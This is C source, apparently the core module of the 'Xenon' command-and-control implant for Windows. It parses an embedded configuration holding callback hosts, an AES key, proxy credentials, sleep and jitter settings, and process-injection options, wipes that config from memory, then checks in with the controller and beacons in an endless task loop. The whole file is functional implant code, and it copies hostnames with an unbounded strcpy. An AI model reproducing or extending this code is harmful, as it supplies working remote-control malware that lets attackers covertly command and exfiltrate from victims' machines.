// Src/Xenon.c

#include <windows.h>

#include "Xenon.h"
#include "Config.h"
#include "Task.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>



/* Agent Config Stored in .data section */
SEC_DATA BYTE AgentConfig[] = S_AGENT_CONFIG;


PCONFIG_XENON xenonConfig = NULL;



VOID XenonConfigure()
{
    PARSER ParserConfig = { 0 };
    SIZE_T sizeUuid     = TASK_UUID_SIZE;
    SIZE_T pathLen      = 0;
    SIZE_T pipeLen      = 0;
    SIZE_T keyLen       = 0;
    SIZE_T proxyLen     = 0;
    SIZE_T userLen      = 0;
    SIZE_T passLen      = 0;

    ParserNew(&ParserConfig, (PBYTE)AgentConfig, sizeof(AgentConfig));
    RtlSecureZeroMemory(AgentConfig, sizeof(AgentConfig));

    // Settings for global Xenon config
    xenonConfig->agentID             = ParserStringCopy(&ParserConfig, &sizeUuid);                  // allocates
    xenonConfig->isEncryption        = ParserGetByte(&ParserConfig);
    if (xenonConfig->isEncryption)
    {
        xenonConfig->aesKey          = ParserStringCopy(&ParserConfig, &keyLen);                     // allocates
    }
    xenonConfig->isProxyEnabled      = ParserGetByte(&ParserConfig);
    if (xenonConfig->isProxyEnabled)
    {
        xenonConfig->proxyUrl        = ParserStringCopy(&ParserConfig, &proxyLen);                   // allocates
        xenonConfig->proxyUsername   = ParserStringCopy(&ParserConfig, &userLen);                    // allocates
        xenonConfig->proxyPassword   = ParserStringCopy(&ParserConfig, &passLen);                    // allocates
    }
    xenonConfig->sleeptime           = ParserGetInt32(&ParserConfig);
    xenonConfig->jitter              = ParserGetInt32(&ParserConfig);
    xenonConfig->rotationStrategy    = ParserGetInt32(&ParserConfig);
    xenonConfig->failoverThreshold   = ParserGetInt32(&ParserConfig);
    // Process Injection Options
    xenonConfig->spawnto           = ParserStringCopy(&ParserConfig, &pathLen);                     // allocates
    xenonConfig->pipename          = ParserStringCopy(&ParserConfig, &pipeLen);                     // allocates

    // Connection Hosts
    UINT32 NmbrOfHosts = ParserGetInt32(&ParserConfig);
    SIZE_T hostnameLen = 0;
    PCHAR Hostname;
    UINT32 Port;
    BOOL isSSL;
    
    for (int i = 0; i < NmbrOfHosts; i++)
    {
        Hostname    = ParserGetString(&ParserConfig, &hostnameLen);
        Port        = ParserGetInt32(&ParserConfig);
        isSSL       = ParserGetByte(&ParserConfig);

        // PCALLBACK_NODE NewCallback = (PCALLBACK_NODE)malloc(sizeof(CALLBACK_NODE));
        PCALLBACK_NODE NewCallback = (PCALLBACK_NODE)LocalAlloc(LPTR, sizeof(CALLBACK_NODE));
        if (NewCallback == NULL) {
            _dbg("Memory allocation failed for new callback node.");
            continue;
        }
        memset(NewCallback, 0, sizeof(CALLBACK_NODE));  // Zero out the memory
        
        strcpy(NewCallback->hostname, Hostname);
        NewCallback->port           = Port;
        NewCallback->isSSL          = isSSL;
        NewCallback->failCount      = 0;
        NewCallback->isDead         = FALSE;
        NewCallback->next           = NULL;       // Initialize the next pointer to NULL
        
        // If the list is empty, set both head and current pointer
        if (xenonConfig->CallbackDomains == NULL) {
            xenonConfig->CallbackDomainHead = NewCallback;
            xenonConfig->CallbackDomains = NewCallback;
        } else {
            // Add the node to the end of the list
            PCALLBACK_NODE Current = xenonConfig->CallbackDomainHead;
            while (Current->next != NULL) {
                Current = Current->next;
            }
            Current->next = NewCallback;
        }

        xenonConfig->CallbackDomains = NewCallback;
        hostnameLen = 0;
    }

    // DEBUG Print Values
    _dbg("AGENT CONFIGURATION VALUES: \n");

    _dbg("[InitUUID]            = %s", xenonConfig->agentID);
    _dbg("[ENCRYPTION]          = %s", xenonConfig->isEncryption ? "TRUE" : "FALSE");
    _dbg("[AesEncrpytionKey]    = %s", xenonConfig->aesKey);
    _dbg("[ProxyEnabled]        = %s", xenonConfig->isProxyEnabled ? "TRUE" : "FALSE");
    _dbg("[RotationStrat]       = %d", xenonConfig->rotationStrategy);
    _dbg("[FailoverThreshold]   = %d", xenonConfig->failoverThreshold);
    _dbg("[SleepTime]           = %d", xenonConfig->sleeptime);
    _dbg("[Jitter]              = %d", xenonConfig->jitter);

    _dbg("[hostname]            = %s", xenonConfig->CallbackDomains->hostname);
    _dbg("[port]                = %d", xenonConfig->CallbackDomains->port);
    _dbg("[SSL]                 = %s", xenonConfig->CallbackDomains->isSSL ? "TRUE" : "FALSE");

}


// Main function
VOID XenonMain()
{
        // Seed the random number generator
        srand((unsigned int)time(NULL));
/* 
    Here we are initializing the main beacon:
        - Parse configuration and set instance settings
        - Perform mythic check-in
        - Start main beaconing routine
*/

    NetworkInitMutex();     // Current workaround for avoiding race condition with global HINTERNET handles

    // Set pointer to Stack allocated instance
    CONFIG_XENON xenon = { 0 };
    xenonConfig = &xenon;

    XenonConfigure();

/* 
    Now we're set up for beaconing
*/

    // Send checkin request
    PARSER data     = { 0 };
    BOOL bStatus    = FALSE;


    // Fills pointer with response data from checkin
    bStatus = CheckinSend(&data);
    if (!bStatus)
    {
        _err("Failed checkin request. Exiting");
        return;
    }
    
    // Set new agent UUID from checkin response
    bStatus = TaskCheckin(&data);
    if (!bStatus)
    {
        _err("Failed processing agent checkin. Exiting");
        return;
    }
    
    ParserDestroy(&data);

    // Main beaconing loop
    while (TRUE)
        TaskRoutine();
}

VOID XenonUpdateUuid(_In_ PCHAR newUUID)
{
    xenonConfig->agentID = newUUID;
    return;
}

